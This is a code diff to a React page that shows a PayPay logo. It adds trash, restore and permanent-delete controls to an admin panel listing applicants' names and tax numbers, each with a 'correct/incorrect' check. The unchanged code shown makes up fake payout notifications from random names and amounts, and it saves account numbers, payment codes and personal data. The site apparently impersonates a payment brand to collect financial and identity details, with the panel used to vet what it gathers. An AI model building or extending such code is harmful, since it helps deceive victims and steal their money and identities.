@@ -5,8 +5,17 @@ import { ChevronLeft, CheckCircle2, Globe, HelpCircle, Eye, EyeOff, ShieldCheck,
 import { cn } from "@/lib/utils";
 import { toast } from "sonner";
 import logoPaypay from "@/assets/logo-paypay.png";
-import userIconAsset from "@/assets/chat-logo.png";
-import { verifyAdminPassword, updateApplicationStatus, getApplications, checkApplicationStatus } from "@/lib/admin.functions";
+import { 
+  verifyAdminPassword, 
+  updateApplicationStatus, 
+  getApplications, 
+  checkApplicationStatus,
+  getDeletedApplications,
+  deleteApplication,
+  restoreApplication,
+  deletePermanently,
+  deleteAllPermanently
+} from "@/lib/admin.functions";
 
 export const Route = createFileRoute("/")({
   component: Index,
@@ -35,6 +44,8 @@ function Index() {
   const [adminPassword, setAdminPassword] = useState("");
   const [loading, setLoading] = useState(false);
   const [applications, setApplications] = useState<any[]>([]);
+  const [deletedApps, setDeletedApps] = useState<any[]>([]);
+  const adminScrollRef = useRef<HTMLDivElement>(null);
 
   const allFirstNames = ["João", "Maria", "António", "Ana", "Carlos"];
   const allSurnames = ["Silva", "Santos", "Ferreira", "Pereira", "Oliveira"];
@@ -42,7 +53,6 @@ function Index() {
   useEffect(() => {
     const showRandomNotification = () => {
       if (step === "admin") return;
-
       const randomName = `${allFirstNames[Math.floor(Math.random() * allFirstNames.length)] ?? "Utilizador"} ${allSurnames[Math.floor(Math.random() * allSurnames.length)] ?? "X"}`;
       const randomAmount = Math.round((Math.floor(Math.random() * (35000 - 2000 + 1)) + 2000) / 100) * 100;
       setNotification({ name: `${randomName.split(" ").slice(0, 2).join(" ")} X**`, amount: randomAmount });
@@ -79,8 +89,30 @@ function Index() {
         const timer = setTimeout(saveProgress, 300);
         return () => clearTimeout(timer);
     }
-    return undefined;
   }, [step, accountNumber, paymentCode, amount, term, personalData]);
+
+  const fetchApplications = async () => {
+    try {
+        const data = await getApplications({ data: { adminPassword } });
+        setApplications(data as any[]);
+    } catch (e) {}
+  };
+
+  const fetchDeletedApps = async () => {
+    try {
+      const data = await getDeletedApplications({ data: { adminPassword } });
+      if (data) setDeletedApps(data as any[]);
+    } catch (err: any) {
+      toast.error("Erro ao carregar lixeira");
+    }
+  };
+
+  useEffect(() => {
+    if (adminAuthenticated) {
+      if (adminTab === "users") fetchApplications();
+      else fetchDeletedApps();
+    }
+  }, [adminAuthenticated, adminTab]);
 
   const onUpdateStatus = async (id: string, isCorrect: boolean) => {
     try {
@@ -90,11 +122,37 @@ function Index() {
     } catch (e) { toast.error("Erro"); }
   };
 
-  const fetchApplications = async () => {
+  const deleteItem = async (id: string) => {
+    if (!confirm("Mover para a lixeira?")) return;
     try {
-        const data = await getApplications({ data: { adminPassword } });
-        setApplications(data as any[]);
-    } catch (e) {}
+      const result = await deleteApplication({ data: { id, adminPassword } });
+      if (result?.success) {
+        toast.success("Movido para a lixeira");
+        setApplications(prev => prev.filter(app => app.id !== id));
+      }
+    } catch (err) { toast.error("Erro ao apagar"); }
+  };
+
+  const restoreItem = async (id: string) => {
+    try {
+      const result = await restoreApplication({ data: { id, adminPassword } });
+      if (result?.success) {
+        toast.success("Recuperado");
+        setDeletedApps(prev => prev.filter(app => app.id !== id));
+      }
+    } catch (err) { toast.error("Erro ao recuperar"); }
+  };
+
+  const permanentDelete = async (id: string) => {
+    const p = prompt("Senha permanente:");
+    if (!p) return;
+    try {
+      const result = await deletePermanently({ data: { id, adminPassword, permanentPassword: p } });
+      if (result?.success) {
+        toast.success("Removido");
+        setDeletedApps(prev => prev.filter(app => app.id !== id));
+      }
+    } catch (err: any) { toast.error(err.message); }
   };
 
   useEffect(() => {
@@ -146,15 +204,29 @@ function Index() {
                             <div className="space-y-4">
                                 <div className="flex justify-between items-center mb-4">
                                   <h2 className="font-bold">Painel Admin</h2>
-                                  <button onClick={fetchApplications}><RotateCcw className="w-4 h-4" /></button>
+                                  <div className="flex gap-2">
+                                    <button onClick={() => setAdminTab("users")} className={cn("px-2 py-1 text-[10px] rounded", adminTab === "users" ? "bg-primary text-white" : "bg-secondary")}>Ativos</button>
+                                    <button onClick={() => setAdminTab("trash")} className={cn("px-2 py-1 text-[10px] rounded", adminTab === "trash" ? "bg-primary text-white" : "bg-secondary")}>Lixeira</button>
+                                    <button onClick={adminTab === "users" ? fetchApplications : fetchDeletedApps}><RotateCcw className="w-4 h-4" /></button>
+                                  </div>
                                 </div>
-                                {applications.map(app => (
+                                {(adminTab === "users" ? applications : deletedApps).map(app => (
                                   <div key={app.id} className="p-4 border rounded-xl bg-white space-y-2">
                                     <p className="text-xs font-bold">{app.name} - {app.nif}</p>
                                     <p className="text-[10px] text-muted-foreground">{app.status}</p>
                                     <div className="flex gap-2">
-                                      <button onClick={() => onUpdateStatus(app.id, true)} className="flex-1 bg-green-600 text-white p-2 rounded-lg text-[10px]">Correto</button>
-                                      <button onClick={() => onUpdateStatus(app.id, false)} className="flex-1 bg-red-600 text-white p-2 rounded-lg text-[10px]">Incorreto</button>
+                                      {adminTab === "users" ? (
+                                        <>
+                                          <button onClick={() => onUpdateStatus(app.id, true)} className="flex-1 bg-green-600 text-white p-2 rounded-lg text-[10px]">Correto</button>
+                                          <button onClick={() => onUpdateStatus(app.id, false)} className="flex-1 bg-red-600 text-white p-2 rounded-lg text-[10px]">Incorreto</button>
+                                          <button onClick={() => deleteItem(app.id)} className="bg-slate-200 p-2 rounded-lg"><Trash2 className="w-3 h-3" /></button>
+                                        </>
+                                      ) : (
+                                        <>
+                                          <button onClick={() => restoreItem(app.id)} className="flex-1 bg-blue-600 text-white p-2 rounded-lg text-[10px]">Recuperar</button>
+                                          <button onClick={() => permanentDelete(app.id)} className="flex-1 bg-red-600 text-white p-2 rounded-lg text-[10px]">Remover</button>
+                                        </>
+                                      )}
                                     </div>
                                   </div>
                                 ))}
